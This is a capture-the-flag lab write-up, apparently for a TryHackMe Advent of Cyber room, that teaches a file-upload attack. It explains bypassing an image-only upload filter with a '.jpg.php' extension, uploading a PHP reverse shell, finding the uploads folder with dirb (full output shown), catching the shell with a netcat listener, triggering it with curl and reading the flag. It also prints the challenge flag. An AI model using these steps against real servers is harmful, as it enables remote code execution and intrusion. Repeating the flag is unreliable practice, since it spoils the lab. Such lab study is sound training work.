# Day 2: The Elf Strikes Back!

## Notes

### GET Parameters and URLs
https://www.thebestfestivalcompany.xyz/index.php?snack=mincePie
- https is protocol
- www is subdomain
- thebestfestivalcompany is the domain
- .xyz is the top level domain (TLD)
- index.php is the resource we're requesting
- ? indicates that a GET request is being made
- snack=mincePie is the parameter of the GET request

### File Uploads
- File uploads are common but are easy to implement insecurely
- When you have the ability to upload files to a server, you have a path straight to RCE (Remote Command Execution)
- While most file uploads use filtering, it's possible to circumvent it by uploading a malicious file that the server can execute. PHP is good for this because most websites are still written with a PHP backend
- File extension filtering is one of the most common filtering techniques, but if it splits the file name at the dot . then it can be bypassed by uploading a double-barrelled extension like .jpg.php
- It's good practice to upload files to a directory that can't be accessed remotely, but this is often not the case: common subdirectories are /uploads, /images, /media, /resources

### Reverse Shells
- Reverse shell: a script that creates a network connection from the server to our attacking machine
- Since many webservers are written with a PHP backend, we need a PHP reverse shells script

### Reverse Shell Listeners
- A reverse shell listener is used to open a network socket to receive a raw connection
- Simplest form of listener can be created with netcat: "nc -nvlp ```<port>```"


## Writeup
1. Navigate to  ```<ip address>``````/<?id=id_here>```
2. View the source code of the file ```<input type=file id="chooseFile" accept=".jpeg,.jpg,.png">``` and see that it only accepts jpeg, jpg, and png files. Only image files are accepted
3. Change the php reverse shell script ip to the attacking machine's ip and the port to a port on the attacking machine that's not being used
4. Change the extension of the script to .jpg.php and upload it
5. Use a tool find hidden directories on the web server. I used dirb: "dirb http://10.10.17.250/"

>-----------------
>DIRB v2.22    
>By The Dark Raver
>-----------------
>
>START_TIME: Wed Nov 24 18:40:53 2021
>URL_BASE: http://10.10.17.250/
>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
>
>-----------------
>
>GENERATED WORDS: 4612                                                          
>
>---- Scanning URL: http://10.10.17.250/ ----
>==> DIRECTORY: http://10.10.17.250/assets/                                                                                                                                              
>+ http://10.10.17.250/cgi-bin/ (CODE:403|SIZE:217)                                                                                                                                      
>+ http://10.10.17.250/favicon.ico (CODE:200|SIZE:1150)                                                                                                                                  
>==> DIRECTORY: http://10.10.17.250/noindex/                                                                                                                                             
>==> DIRECTORY: http://10.10.17.250/uploads/                                                                                                                                             
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.17.250/assets/ ----
>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
>    (Use mode '-w' if you want to scan it anyway)
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.17.250/noindex/ ----
>==> DIRECTORY: http://10.10.17.250/noindex/common/                                                                                                                                      
>+ http://10.10.17.250/noindex/index (CODE:200|SIZE:4006)                                                                                                                                
>+ http://10.10.17.250/noindex/index.html (CODE:200|SIZE:4006)                                                                                                                           
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.17.250/uploads/ ----
>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
>    (Use mode '-w' if you want to scan it anyway)
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.17.250/noindex/common/ ----
>==> DIRECTORY: http://10.10.17.250/noindex/common/css/                                                                                                                                  
>==> DIRECTORY: http://10.10.17.250/noindex/common/fonts/                                                                                                                                
>==> DIRECTORY: http://10.10.17.250/noindex/common/images/                                                                                                                               
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.17.250/noindex/common/css/ ----
>+ http://10.10.17.250/noindex/common/css/styles (CODE:200|SIZE:71634)                                                                                                                   
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.17.250/noindex/common/fonts/ ----
>                                                                                                                                                                                        
>---- Entering directory: http://10.10.17.250/noindex/common/images/ ----
>                                                                                                                                                                                        
>-----------------
>END_TIME: Wed Nov 24 18:42:11 2021
>DOWNLOADED: 27672 - FOUND: 5

6. We see that uploaded files are in /uploads/
7. Start a netcat listener on the port we used in the script: "nc -nvlp 443"
8. Now we navigate to the browser to launch the payload or just use curl: "curl http://10.10.17.250/uploads/php-reverse-shell.jpg.php"
10. Now we have a reverse shell! To find the flag: "cat /var/www/flag.txt" and we get THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}
